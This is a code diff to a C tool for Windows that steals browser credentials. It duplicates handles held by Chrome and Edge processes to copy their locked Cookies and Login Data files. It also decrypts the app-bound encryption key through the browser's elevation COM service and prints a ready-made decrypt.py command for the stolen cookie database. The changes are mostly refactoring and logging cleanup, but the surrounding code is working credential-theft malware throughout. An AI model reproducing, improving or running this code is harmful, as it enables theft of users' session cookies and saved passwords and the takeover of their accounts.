@@ -13,7 +13,7 @@
 #include <string.h>
 #include <ncrypt.h>
 #define MAX_PATH_LEN 1024
-#define DEFAULT_COPY_PATH "C:\\temp\\startwithc"
+#define DEFAULT_COPY_PATH "C:\\temp"
 
 
 #define IMPORT_RESOLVE FARPROC SHGetFolderPath = Resolver("shell32", "SHGetFolderPathA"); \
@@ -47,7 +47,7 @@ CHAR *GetFileContent(CHAR *path) {
 
     //get appdata local path and append path 
     if (path[0] == '\\') {
-        printf("Appending local app data path\n");
+        printf("[DEBUG] Appending local app data path\n");
         CHAR appdata[MAX_PATH];
         SHGetFolderPath(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, appdata);
         PathAppend(appdata, path);
@@ -296,7 +296,7 @@ VOID GetAppBoundKey(CHAR * key, CHAR * browser, const CLSID CLSID_Elevator, cons
         DWORD decrypted_size = SysStringByteLen(plaintext_data);
         //printf("Decrypted Data Size: %d\n", decrypted_size);
         printf("[SUCCESS] Decrypted App Bound Key: %s\n", BytesToHexString(plaintext_data, decrypted_size));
-        printf("[SUCCESS] `python3 decrypt.py -k \"%s\" -o cookie-editor -f ChromeCookies.db`",BytesToHexString(plaintext_data, decrypted_size));
+        printf("[SUCCESS] `python3 decrypt.py -k \"%s\" -o cookie-editor -f ChromeCookies.db`\n",BytesToHexString(plaintext_data, decrypted_size));
 
     } else {
         printf("[ERROR] App Bound Key Decryption failed. Last error: %lu\n[ERROR] If error 203, beacon is most likely not operating out of correct file path. \n[ERROR] You must run this out of the web browser's application directory (ie 'C:\\Program Files\\Google\\Chrome\\Application'\n", last_error);
@@ -341,7 +341,7 @@ VOID GetEncryptionKey(char * browser) {
     //     printf("Reading the file failed.\n");
     //     return;
     // }
-    printf("[DEBUG] Got 'Local State' File");
+    printf("[DEBUG] Got 'Local State' File\n");
     // // extract CHAR pattern[] = "\"encrypted_key\":\""; from file
     // CHAR pattern[] = "\"encrypted_key\":\"";
     // key = ExtractKey(data, pattern);
@@ -621,6 +621,67 @@ VOID GetBrowserData(char * browser, int cookie, int loginData, char * folderPath
     }
 }
 
+
+char* getNameOfHandle(HANDLE hDuplicate) {
+    DWORD dwRet;
+    TCHAR pathBuffer[MAX_PATH];
+
+    dwRet = GetFinalPathNameByHandle(hDuplicate, pathBuffer, MAX_PATH, VOLUME_NAME_DOS);
+    if (dwRet == 0 || dwRet >= MAX_PATH) {
+        // Failed to get path or buffer too small
+        return NULL;
+    }
+
+    // Allocate memory for the result string
+    char* result = (char*)malloc(dwRet + 1);
+    if (result == NULL) {
+        return NULL;
+    }
+
+    #ifdef UNICODE
+        // Convert wide string to multibyte
+        WideCharToMultiByte(CP_UTF8, 0, pathBuffer, -1, result, dwRet + 1, NULL, NULL);
+    #else
+        strcpy(result, pathBuffer);
+    #endif
+
+    return result;
+}
+
+
+
+
+char* ConvertWCharToChar(const WCHAR* wideStr, int wideLen) {
+    // wide char to regular char buffer conversion
+    // Calculate required buffer size
+    int requiredSize = WideCharToMultiByte(CP_UTF8, 0, wideStr, wideLen, NULL, 0, NULL, NULL);
+    if (requiredSize <= 0) {
+        printf("[ERROR] WideCharToMultiByte failed. Error code: %lu\n", GetLastError());
+        return NULL;
+    }
+
+    // Allocate buffer
+    char* result = (char*)malloc(requiredSize + 1); // +1 for null terminator
+    if (!result) {
+        printf("[ERROR] Memory allocation failed.\n");
+        return NULL;
+    }
+
+    // Perform conversion
+    int converted = WideCharToMultiByte(CP_UTF8, 0, wideStr, wideLen, result, requiredSize, NULL, NULL);
+    if (converted <= 0) {
+        printf("[ERROR] Conversion failed. Error code: %lu\n", GetLastError());
+        free(result);
+        return NULL;
+    }
+
+    result[converted] = '\0'; // Null-terminate
+    return result;
+}
+
+
+
+
 BOOL GetBrowserFile(DWORD PID, CHAR *browserFile, CHAR *downloadFileName, CHAR * folderPath) {
     IMPORT_RESOLVE;
     printf("[DEBUG] GetBrowserFile(PID %d, browserFile %s, downloadFileName %s, folderPath %s)\n",PID,browserFile,downloadFileName,folderPath);
@@ -660,10 +721,11 @@ BOOL GetBrowserFile(DWORD PID, CHAR *browserFile, CHAR *downloadFileName, CHAR *
     for(i = 0; i < shi->NumberOfHandles; i++) {
         SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX handle = shi->Handles[i];
         if((DWORD)(ULONG_PTR)handle.UniqueProcessId == PID) {
-            //printf("Found PID");
             POBJECT_NAME_INFORMATION objectNameInfo = (POBJECT_NAME_INFORMATION)malloc(0x1000);
             ULONG returnLength = 0;
             NTSTATUS ret = 0;
+
+            // filtering out certain handles based on their access rights and attributes
             if(handle.GrantedAccess != 0x001a019f || ( handle.HandleAttributes != 0x2 && handle.GrantedAccess == 0x0012019f)) {
                 HANDLE hProc = OpenProcess(PROCESS_DUP_HANDLE, FALSE, PID);
                 if(hProc == INVALID_HANDLE_VALUE) {
@@ -672,21 +734,21 @@ BOOL GetBrowserFile(DWORD PID, CHAR *browserFile, CHAR *downloadFileName, CHAR *
                     free(objectNameInfo);
                     return FALSE;
                 }
-
+                
                 HANDLE hDuplicate = NULL;
                 if(!DuplicateHandle(hProc, (HANDLE)(intptr_t)handle.HandleValue, (HANDLE) -1, &hDuplicate, 0, FALSE, DUPLICATE_SAME_ACCESS)) {
-                    //printf("[DEBUG] DuplicateHandle failed %d\n", GetLastError());
+                    // printf("[DEBUG] DuplicateHandle failed %d\n", GetLastError());
                     continue;                  
                 }
+                // printf("[DEBUG] Handle to file %s duplicated \n",getNameOfHandle(hDuplicate));
                 //Check if the handle exists on disk, otherwise the program will hang
                 DWORD fileType = GetFileType(hDuplicate);
                 if (fileType != FILE_TYPE_DISK) {
-                    //printf("[DEBUG] NOT A FILE\n");
+                    // printf("[DEBUG] NOT A FILE\n");
                     continue;
                 }
-                //printf("Duplicated Handle, confirmed file on disk");
+                // query for name info               
                 ret = NtQueryObject(hDuplicate,ObjectNameInformation, objectNameInfo, 0x1000, &returnLength);
-                
                 if (ret != 0)
                 {
                     printf("[ERROR] Failed NtQueryObject\n");
@@ -695,30 +757,32 @@ BOOL GetBrowserFile(DWORD PID, CHAR *browserFile, CHAR *downloadFileName, CHAR *
                     return FALSE;
                 }
                 if (ret == 0 && objectNameInfo->Name.Length > 0){
-                    char handleName[1024];
-                    sprintf(handleName, MAX_PATH, L"%.*s", objectNameInfo->Name.Length / sizeof(WCHAR), objectNameInfo->Name.Buffer);
+                    // printf("[DEBUG] NtQueryObject returned %d with objectNameInfo->Name.Length as %d\n",ret,objectNameInfo->Name.Length);
+                    // perform conversion of wide char buffer to regular buffer
+                    WCHAR* wideName = objectNameInfo->Name.Buffer;
+                    int wideLength = objectNameInfo->Name.Length / sizeof(WCHAR);
+                    char* handleName = ConvertWCharToChar(wideName, wideLength);
+                    
 
+                    // query the object type information for the duplicated handle
                     PPUBLIC_OBJECT_TYPE_INFORMATION objectTypeInfo = (PPUBLIC_OBJECT_TYPE_INFORMATION)malloc(0x1000);
                     ret = NtQueryObject(hDuplicate,ObjectTypeInformation, objectTypeInfo, 0x1000, &returnLength);
-                    printf("%d",ret);
                     if (ret != 0)
                     {
-                        printf("[ERROR] Failed NtQueryObject");
+                        printf("[ERROR] Failed NtQueryObject\n");
                         GlobalFree(shi);
                         free(objectTypeInfo);
                         free(objectNameInfo);
+                        free(handleName);
                         return FALSE;
                     }
+                    // we have a valid file on the system
                     if (ret == 0 && (strcmp(objectTypeInfo,"File"))){
-                        printf("[DEBUG] handleName: %s\n", handleName);
                         if (strstr(handleName, browserFile) != NULL && (strcmp(&handleName[strlen(handleName) - 4], "Data") == 0 || strcmp(&handleName[strlen(handleName) - 7], "Cookies") == 0)){
-
-                            printf("Handle to %s Was FOUND with PID: %lu\n", browserFile, PID);
-                            //printf("Handle Name: %.*ws\n", objectNameInfo->Name.Length / sizeof(WCHAR), objectNameInfo->Name.Buffer);
+                            printf("[SUCCESS] Handle to %s Was FOUND with PID: %lu\n", handleName, PID);
 
                             SetFilePointer(hDuplicate, 0, 0, FILE_BEGIN);
                             DWORD dwFileSize = GetFileSize(hDuplicate, NULL);
-                            printf("file size is %d\n", dwFileSize);
                             DWORD dwRead = 0;
                             CHAR *buffer = (CHAR*)GlobalAlloc(GPTR, dwFileSize);
                             ReadFile(hDuplicate, buffer, dwFileSize, &dwRead, NULL);
@@ -730,11 +794,11 @@ BOOL GetBrowserFile(DWORD PID, CHAR *browserFile, CHAR *downloadFileName, CHAR *
                                 HANDLE hFile = CreateFileA(copyFilePath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
                     
                                 if (hFile == INVALID_HANDLE_VALUE) {
-                                    printf("Failed to write password file to %s\n", copyFilePath);
+                                    printf("[ERROR] Failed to copy %s to %s\n", handleName, copyFilePath);
                                 } else {
                                     DWORD written = 0;
                                     WriteFile(hFile, buffer, dwFileSize, &written, NULL);
-                                    printf("Wrote password file to: %s\n", copyFilePath);
+                                    printf("[SUCCESS] Copied to: %s\n", copyFilePath);
                                     CloseHandle(hFile);
                                 }
                             } else {
@@ -745,13 +809,16 @@ BOOL GetBrowserFile(DWORD PID, CHAR *browserFile, CHAR *downloadFileName, CHAR *
                             GlobalFree(shi);
                             free(objectTypeInfo);
                             free(objectNameInfo);
+                            free(handleName);
                             return TRUE;
                         }
                         
                     }else{
+                        printf("[DEBUG] Not the file we're looking for.\n");
                         CloseHandle(hDuplicate);
                         free(objectTypeInfo);
                         free(objectNameInfo);
+                        free(handleName);
                     }
                 }
             }
@@ -1304,21 +1371,6 @@ int main(int argc, char *argv[]) {
     char * copyFile = args.copyFile;
     char * localStateFile = args.localStateFile;
     BOOL status = FALSE;
-
-    printf("[DEBUG] chrome: %d\n", chrome);
-    printf("[DEBUG] edge: %d\n", edge);
-    printf("[DEBUG] system: %d\n", system);
-    printf("[DEBUG] firefox: %d\n", firefox);
-    printf("[DEBUG] chromeCookiesPID: %d\n", chromeCookiesPID);
-    printf("[DEBUG] chromeLoginDataPID: %d\n", chromeLoginDataPID);
-    printf("[DEBUG] edgeCookiesPID: %d\n", edgeCookiesPID);
-    printf("[DEBUG] edgeLoginDataPID: %d\n", edgeLoginDataPID);
-    printf("[DEBUG] pid: %d\n", pid);
-    printf("[DEBUG] keyOnly: %d\n", keyOnly);
-    printf("[DEBUG] cookieOnly: %d\n", cookieOnly);
-    printf("[DEBUG] loginDataOnly: %d\n", loginDataOnly);
-    printf("[DEBUG] copyFile: %s\n", copyFile ? copyFile : "(null)");
-    printf("[DEBUG] localStateFile: %s\n", localStateFile ? localStateFile : "(null)");
 
     if (!copyFile){
         printf("[ERROR] --copy-file must be supplied.");
